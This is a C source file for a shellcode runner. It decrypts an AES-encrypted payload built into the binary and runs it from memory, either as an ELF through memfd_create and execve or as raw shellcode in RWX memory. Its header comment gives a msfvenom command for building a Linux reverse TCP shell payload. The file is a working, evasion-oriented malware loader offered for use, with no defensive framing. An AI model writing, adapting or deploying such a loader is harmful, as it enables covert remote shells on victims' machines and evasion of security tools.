/*
 * shellcode-runner.c — AES-128-ECB decrypted payload executor
 *
 * Handles both raw shellcode (mmap + jump) and ELF binaries (memfd + execve).
 *
 * Drop shellcode.bin in the project root and run make:
 *   msfvenom -p linux/x64/shell_reverse_tcp LHOST=... LPORT=... -f raw -o shellcode.bin
 *   make
 */

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <unistd.h>

#include "aes.h"        /* Hand-rolled AES-128-ECB decrypt */
#include "shellcode.h"  /* Generated: aes_key[], shellcode[], shellcode_len, plaintext_len */

extern char **environ;

int main(int argc, char **argv) {
    /* Decrypt in place */
    int pt_len = aes_decrypt_ecb(shellcode, shellcode_len, aes_key, shellcode);
    if (pt_len < 0)
        return 1;

    /* ELF binary: execute from memory via memfd */
    if (pt_len >= 4 && shellcode[0] == 0x7f &&
        shellcode[1] == 'E' && shellcode[2] == 'L' && shellcode[3] == 'F') {
        int fd = syscall(SYS_memfd_create, "", 0);
        if (fd < 0)
            return 1;
        write(fd, shellcode, (size_t)pt_len);
        char fdpath[64];
        snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);
        execve(fdpath, argv, environ);
        return 1;
    }

    /* Raw shellcode: mmap RWX + jump */
    void *mem = mmap(NULL, (size_t)pt_len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED)
        return 1;

    memcpy(mem, shellcode, (size_t)pt_len);
    ((void(*)())mem)();
    return 0;
}
